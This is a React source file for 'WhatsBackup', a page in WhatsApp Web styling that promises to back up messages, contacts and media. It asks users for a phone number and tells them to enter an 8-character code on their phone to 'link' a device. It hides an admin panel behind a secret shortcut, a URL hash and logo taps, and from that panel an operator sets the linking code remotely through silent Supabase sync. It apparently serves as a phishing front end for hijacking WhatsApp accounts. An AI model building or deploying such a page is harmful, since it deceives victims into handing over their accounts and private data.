import React, { useState, useEffect, useRef } from 'react';
import { Smartphone, HardDrive, Lock } from 'lucide-react';
import { WhatsAppLinkDevice } from './components/WhatsAppLinkDevice';
import { WhatsAppDataBackup } from './components/WhatsAppDataBackup';
import { ReportViewerModal } from './components/ReportViewerModal';
import { AdminPanel } from './components/AdminPanel';
import {
  DEFAULT_ADMIN_CONFIG,
  DEFAULT_LINKED_DEVICE,
  INITIAL_BACKUP_CATEGORIES,
  INITIAL_BACKUP_HISTORY,
} from './data/sampleData';
import { AdminConfig, LinkedDevice, BackupCategory, BackupRecord, CategoryId, RealtimeSyncStatus } from './types';
import {
  subscribeToDeviceConnectionRealtime,
  updateRemoteDeviceConnection,
  fetchRemoteAdminSettings,
} from './services/supabaseClient';

export default function App() {
  // Theme state
  const [darkMode, setDarkMode] = useState<boolean>(() => {
    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
  });

  // Realtime synchronization state (silent background sync)
  const [syncStatus, setSyncStatus] = useState<RealtimeSyncStatus>('connecting');

  // ONLY 2 MAIN OPTIONS: 'link' (Link Device) or 'backup' (Data Backup)
  const [activeTab, setActiveTab] = useState<'link' | 'backup'>('link');

  // Admin modal toggle for discreet management of 8-character code
  const [adminModalOpen, setAdminModalOpen] = useState<boolean>(false);
  const [logoClicks, setLogoClicks] = useState<number>(0);

  // Administrative configuration state (persists in session)
  const [adminConfig, setAdminConfig] = useState<AdminConfig>(() => {
    const saved = localStorage.getItem('whatsbackup_admin_config');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return DEFAULT_ADMIN_CONFIG;
      }
    }
    return DEFAULT_ADMIN_CONFIG;
  });

  // Virtual Linked Device state
  const [linkedDevice, setLinkedDevice] = useState<LinkedDevice>(() => {
    const saved = localStorage.getItem('whatsbackup_device');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return DEFAULT_LINKED_DEVICE;
      }
    }
    return DEFAULT_LINKED_DEVICE;
  });

  // Backup categories selection state
  const [categories, setCategories] = useState<BackupCategory[]>(INITIAL_BACKUP_CATEGORIES);

  // Backup records history
  const [backupHistory, setBackupHistory] = useState<BackupRecord[]>(() => {
    const saved = localStorage.getItem('whatsbackup_history');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return INITIAL_BACKUP_HISTORY;
      }
    }
    return INITIAL_BACKUP_HISTORY;
  });

  // Detailed report viewer modal
  const [reportModalRecord, setReportModalRecord] = useState<BackupRecord | null>(null);

  // Sync dark mode class on documentElement
  useEffect(() => {
    if (darkMode) {
      document.documentElement.classList.add('dark');
    } else {
      document.documentElement.classList.remove('dark');
    }
  }, [darkMode]);

  // Persist admin config
  useEffect(() => {
    localStorage.setItem('whatsbackup_admin_config', JSON.stringify(adminConfig));
  }, [adminConfig]);

  // Persist device state
  useEffect(() => {
    localStorage.setItem('whatsbackup_device', JSON.stringify(linkedDevice));
  }, [linkedDevice]);

  // Persist backup history
  useEffect(() => {
    localStorage.setItem('whatsbackup_history', JSON.stringify(backupHistory));
  }, [backupHistory]);

  // SUPABASE AUTHORITATIVE INITIAL LOAD & REALTIME SUBSCRIPTION
  // Loads latest live settings from Supabase on startup, then listens to Realtime changes
  useEffect(() => {
    let isMounted = true;

    // 1. Authoritative initial fetch from Supabase
    fetchRemoteAdminSettings(adminConfig.supabaseUrl, adminConfig.supabaseAnonKey).then((remote) => {
      if (remote && isMounted) {
        setAdminConfig((prev) => ({
          ...prev,
          allowConnection: remote.device_connection_enabled,
          linkingCode: remote.linking_code || prev.linkingCode,
          isActive: remote.is_active ?? prev.isActive,
          adminEmail: remote.updated_by || prev.adminEmail,
          updatedAt: remote.updated_at || prev.updatedAt,
        }));
      }
    });

    // 2. Realtime WebSocket subscription (updates across incognito, normal, and mobile)
    const unsubscribe = subscribeToDeviceConnectionRealtime(
      (enabled, data) => {
        setAdminConfig((prev) => {
          const nextCode = data?.linking_code || prev.linkingCode;
          const nextActive = data?.is_active ?? prev.isActive;
          const nextEmail = data?.updated_by || prev.adminEmail;
          if (
            prev.allowConnection === enabled &&
            prev.linkingCode === nextCode &&
            prev.isActive === nextActive &&
            prev.adminEmail === nextEmail
          ) {
            return prev;
          }
          return {
            ...prev,
            allowConnection: enabled,
            linkingCode: nextCode,
            isActive: nextActive,
            adminEmail: nextEmail,
            adminUsername: data?.admin_username || prev.adminUsername,
            updatedAt: data?.updated_at || prev.updatedAt,
          };
        });
      },
      (status) => {
        setSyncStatus(status);
      },
      {
        customUrl: adminConfig.supabaseUrl,
        customAnonKey: adminConfig.supabaseAnonKey,
      }
    );

    return () => {
      isMounted = false;
      unsubscribe();
    };
  }, [adminConfig.supabaseUrl, adminConfig.supabaseAnonKey]);

  // Secret triggers: Keyboard Shortcut (Ctrl+Shift+A) or URL hash (#admin or #backend)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      // Ctrl + Shift + A or Cmd + Shift + A opens backend modal
      if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
        e.preventDefault();
        setAdminModalOpen((prev) => !prev);
      }
    };

    const handleHashChange = () => {
      if (window.location.hash === '#admin' || window.location.hash === '#backend') {
        setAdminModalOpen(true);
      }
    };

    window.addEventListener('keydown', handleKeyDown);
    window.addEventListener('hashchange', handleHashChange);
    if (window.location.hash === '#admin' || window.location.hash === '#backend') {
      setAdminModalOpen(true);
    }

    return () => {
      window.removeEventListener('keydown', handleKeyDown);
      window.removeEventListener('hashchange', handleHashChange);
    };
  }, []);

  // Reliable Logo click trigger: 3 taps within 2.5 seconds (works on mobile & desktop)
  const clickTimestampsRef = useRef<number[]>([]);
  const handleLogoSecretClick = () => {
    const now = Date.now();
    clickTimestampsRef.current = [
      ...clickTimestampsRef.current.filter((t) => now - t < 2500),
      now,
    ];
    if (clickTimestampsRef.current.length >= 3) {
      clickTimestampsRef.current = [];
      setAdminModalOpen(true);
    }
  };

  // Device Link handler
  const handleDeviceLinked = (deviceData: Partial<LinkedDevice>) => {
    setLinkedDevice((prev) => ({
      ...prev,
      ...deviceData,
    }));
  };

  // Disconnect handler
  const handleDisconnectDevice = () => {
    setLinkedDevice((prev) => ({
      ...prev,
      isLinked: false,
      linkedAt: null,
    }));
  };

  // Category toggle
  const handleToggleCategory = (id: CategoryId) => {
    setCategories((prev) =>
      prev.map((c) => (c.id === id ? { ...c, selected: !c.selected } : c))
    );
  };

  // Select all categories
  const handleSelectAllCategories = (select: boolean) => {
    setCategories((prev) => prev.map((c) => ({ ...c, selected: select })));
  };

  // Complete backup simulation
  const handleBackupComplete = (record: BackupRecord) => {
    setBackupHistory((prev) => [record, ...prev]);
  };

  return (
    <div className="min-h-screen bg-[#eae6df] dark:bg-[#0c1317] flex flex-col font-sans antialiased text-[#111b21] dark:text-[#e9edef] relative">
      
      {/* WHATSAPP WEB SIGNATURE GREEN TOP BAR */}
      <div className="bg-[#00a884] dark:bg-[#005c4b] h-36 sm:h-56 w-full fixed top-0 left-0 z-0">
        <div className="max-w-5xl mx-auto px-3 sm:px-8 pt-3.5 sm:pt-5 flex items-center justify-between">
          
          {/* WhatsBackup Brand Logo (Secret: 3 clicks opens backend settings) */}
          <div
            onClick={handleLogoSecretClick}
            className="flex items-center gap-2.5 sm:gap-3 select-none cursor-pointer"
            title="WhatsBackup"
          >
            <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-white text-[#00a884] flex items-center justify-center font-bold text-base sm:text-lg shadow-sm shrink-0">
              <svg viewBox="0 0 24 24" className="w-5 h-5 sm:w-6 sm:h-6 fill-current">
                <path d="M12 2C6.48 2 2 6.48 2 12C2 13.85 2.5 15.58 3.38 17.07L2.05 21.95L7.07 20.63C8.52 21.5 10.2 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM16.63 15.56C16.44 16.1 15.55 16.58 15.06 16.66C14.65 16.73 14.12 16.76 13.53 16.57C12.98 16.39 12.24 16.14 11.27 15.72C9.17 14.81 7.79 12.7 7.68 12.56C7.58 12.42 6.84 11.44 6.84 10.42C6.84 9.4 7.37 8.9 7.57 8.69C7.75 8.5 7.99 8.44 8.24 8.44C8.33 8.44 8.42 8.44 8.5 8.45C8.73 8.46 8.85 8.48 9 8.84C9.19 9.3 9.65 10.42 9.71 10.53C9.77 10.65 9.8 10.79 9.72 10.95C9.64 11.11 9.57 11.2 9.46 11.33C9.35 11.46 9.24 11.55 9.13 11.68C9.01 11.8 8.89 11.93 9.03 12.16C9.17 12.39 9.65 13.18 10.36 13.81C11.28 14.63 12.03 14.89 12.29 15C12.55 15.11 12.7 15.09 12.86 14.91C13.02 14.73 13.53 14.13 13.72 13.86C13.91 13.59 14.09 13.63 14.33 13.72C14.58 13.81 15.88 14.45 16.14 14.58C16.4 14.71 16.57 14.78 16.63 14.89C16.69 15 16.69 15.38 16.63 15.56Z" />
              </svg>
            </div>
            <div>
              <span className="font-bold text-white text-base sm:text-lg tracking-tight uppercase block leading-tight">
                WHATSBACKUP
              </span>
              <span className="block text-[9px] sm:text-[10px] text-white/90 font-semibold tracking-wider">
                DATA BACKUP SYSTEM
              </span>
            </div>
          </div>

          {/* Quick Access Admin Button for Mobile & Desktop */}
          <button
            type="button"
            onClick={() => setAdminModalOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-full bg-white/15 hover:bg-white/25 active:scale-95 text-white text-xs font-semibold backdrop-blur-xs transition-all cursor-pointer shadow-xs border border-white/20 select-none z-10"
            title="Admin Backend Settings"
          >
            <Lock className="w-3.5 h-3.5" />
            <span>Admin</span>
          </button>
        </div>
      </div>

      {/* MAIN FLOATING CONTAINER (WHATSAPP WEB CARD STYLE) */}
      <div className="relative z-10 max-w-4xl w-full mx-auto px-2 sm:px-6 pt-16 sm:pt-28 pb-8 sm:pb-12 flex-1 flex flex-col justify-center">
        
        {/* THE FLOATING CARD */}
        <div className="bg-white dark:bg-[#111b21] rounded-xl sm:rounded-2xl shadow-lg border border-slate-200/80 dark:border-slate-800 overflow-hidden flex flex-col">
          
          {/* DATA BACKUP SYSTEM DETAILS & METHOD (TAREEQA) */}
          <div className="p-3.5 sm:p-8 bg-white dark:bg-[#111b21] border-b border-slate-200 dark:border-slate-800">
            <div className="max-w-3xl mx-auto">
              <div className="flex items-center gap-2.5 sm:gap-3 mb-1.5 sm:mb-2">
                <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-[#00a884]/15 text-[#00a884] flex items-center justify-center font-bold shrink-0">
                  <HardDrive className="w-4 h-4 sm:w-5 sm:h-5" />
                </div>
                <div>
                  <h1 className="text-lg sm:text-2xl font-bold text-[#111b21] dark:text-white tracking-tight">
                    Data Backup System
                  </h1>
                  <p className="text-[11px] sm:text-sm text-[#667781] dark:text-[#8696a0] leading-tight sm:leading-normal">
                    Backup your WhatsApp messages contacts photos and videos directly to your device.
                  </p>
                </div>
              </div>

              {/* Tareeqa / Method Cards */}
              <div className="mt-3 sm:mt-5 grid grid-cols-1 sm:grid-cols-3 gap-2 sm:gap-3">
                <div
                  onClick={() => setActiveTab('link')}
                  className="p-2.5 sm:p-3.5 rounded-xl bg-[#f0f2f5] dark:bg-[#202c33] border border-slate-200/80 dark:border-slate-800 cursor-pointer hover:border-[#00a884] transition-colors"
                >
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-[#00a884] text-white flex items-center justify-center text-[10px] sm:text-xs font-bold mb-1.5 sm:mb-2">
                    1
                  </div>
                  <h2 className="text-xs font-bold text-[#111b21] dark:text-white mb-0.5 sm:mb-1">
                    Step 1: Link Device
                  </h2>
                  <p className="text-[10px] sm:text-[11px] text-[#667781] dark:text-[#8696a0] leading-relaxed">
                    Enter phone number and enter the 8-character verification code on your phone to link.
                  </p>
                </div>

                <div
                  onClick={() => setActiveTab('backup')}
                  className="p-2.5 sm:p-3.5 rounded-xl bg-[#f0f2f5] dark:bg-[#202c33] border border-slate-200/80 dark:border-slate-800 cursor-pointer hover:border-[#00a884] transition-colors"
                >
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-[#00a884] text-white flex items-center justify-center text-[10px] sm:text-xs font-bold mb-1.5 sm:mb-2">
                    2
                  </div>
                  <h2 className="text-xs font-bold text-[#111b21] dark:text-white mb-0.5 sm:mb-1">
                    Step 2: Select Data
                  </h2>
                  <p className="text-[10px] sm:text-[11px] text-[#667781] dark:text-[#8696a0] leading-relaxed">
                    Choose what you want to backup: Messages Contacts Photos Videos
                  </p>
                </div>

                <div
                  onClick={() => setActiveTab('backup')}
                  className="p-2.5 sm:p-3.5 rounded-xl bg-[#f0f2f5] dark:bg-[#202c33] border border-slate-200/80 dark:border-slate-800 cursor-pointer hover:border-[#00a884] transition-colors"
                >
                  <div className="w-5 h-5 sm:w-6 sm:h-6 rounded-full bg-[#00a884] text-white flex items-center justify-center text-[10px] sm:text-xs font-bold mb-1.5 sm:mb-2">
                    3
                  </div>
                  <h2 className="text-xs font-bold text-[#111b21] dark:text-white mb-0.5 sm:mb-1">
                    Step 3: Save Backup
                  </h2>
                  <p className="text-[10px] sm:text-[11px] text-[#667781] dark:text-[#8696a0] leading-relaxed">
                    Click Start Backup to process your data and download the backup report file.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* JUST 2 OPTIONS (NAVIGATION TABS) */}
          <div className="flex border-b border-slate-200 dark:border-slate-800 bg-[#f0f2f5] dark:bg-[#202c33]">
            
            {/* OPTION 1: LINK DEVICE */}
            <button
              onClick={() => setActiveTab('link')}
              className={`flex-1 py-3 sm:py-4 px-2 sm:px-4 text-center text-xs sm:text-sm font-semibold flex items-center justify-center gap-1.5 sm:gap-2.5 transition-all cursor-pointer border-b-3 ${
                activeTab === 'link'
                  ? 'border-[#00a884] text-[#00a884] dark:text-[#25D366] bg-white dark:bg-[#111b21]'
                  : 'border-transparent text-[#667781] dark:text-[#8696a0] hover:text-[#111b21] dark:hover:text-white'
              }`}
            >
              <Smartphone className="w-3.5 h-3.5 sm:w-4 sm:h-4 shrink-0" />
              <span>1. Link Device</span>
              {linkedDevice.isLinked && (
                <span className="w-2 h-2 rounded-full bg-[#25D366] animate-pulse shrink-0"></span>
              )}
            </button>

            {/* OPTION 2: DATA BACKUP */}
            <button
              onClick={() => setActiveTab('backup')}
              className={`flex-1 py-3 sm:py-4 px-2 sm:px-4 text-center text-xs sm:text-sm font-semibold flex items-center justify-center gap-1.5 sm:gap-2.5 transition-all cursor-pointer border-b-3 ${
                activeTab === 'backup'
                  ? 'border-[#00a884] text-[#00a884] dark:text-[#25D366] bg-white dark:bg-[#111b21]'
                  : 'border-transparent text-[#667781] dark:text-[#8696a0] hover:text-[#111b21] dark:hover:text-white'
              }`}
            >
              <HardDrive className="w-3.5 h-3.5 sm:w-4 sm:h-4 shrink-0" />
              <span>2. Data Backup</span>
            </button>
          </div>

          {/* CARD BODY CONTENT */}
          <div className="p-2 sm:p-8 min-h-[380px] sm:min-h-[460px] flex flex-col justify-center">
            {activeTab === 'link' ? (
              <WhatsAppLinkDevice
                adminConfig={adminConfig}
                linkedDevice={linkedDevice}
                syncStatus={syncStatus}
                onDeviceLinked={handleDeviceLinked}
                onDisconnectDevice={handleDisconnectDevice}
                onGoToBackup={() => setActiveTab('backup')}
              />
            ) : (
              <WhatsAppDataBackup
                linkedDevice={linkedDevice}
                categories={categories}
                onToggleCategory={handleToggleCategory}
                onSelectAll={handleSelectAllCategories}
                onGoToLinkDevice={() => setActiveTab('link')}
                onBackupComplete={handleBackupComplete}
                onViewReport={(record) => setReportModalRecord(record)}
              />
            )}
          </div>
        </div>
      </div>

      {/* DETAILED REPORT VIEWER MODAL */}
      <ReportViewerModal
        record={reportModalRecord}
        isOpen={Boolean(reportModalRecord)}
        onClose={() => setReportModalRecord(null)}
      />

      {/* ADMIN CONTROL PANEL MODAL (DISCREET & FUNCTIONAL) */}
      {adminModalOpen && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4">
          <div className="w-full max-w-3xl max-h-[90vh] overflow-y-auto rounded-2xl">
            <AdminPanel
              adminConfig={adminConfig}
              onUpdateAdminConfig={setAdminConfig}
              linkedDevice={linkedDevice}
              onDisconnectDevice={handleDisconnectDevice}
              backupHistory={backupHistory}
              syncStatus={syncStatus}
              onBackToUserView={() => setAdminModalOpen(false)}
            />
          </div>
        </div>
      )}
    </div>
  );
}
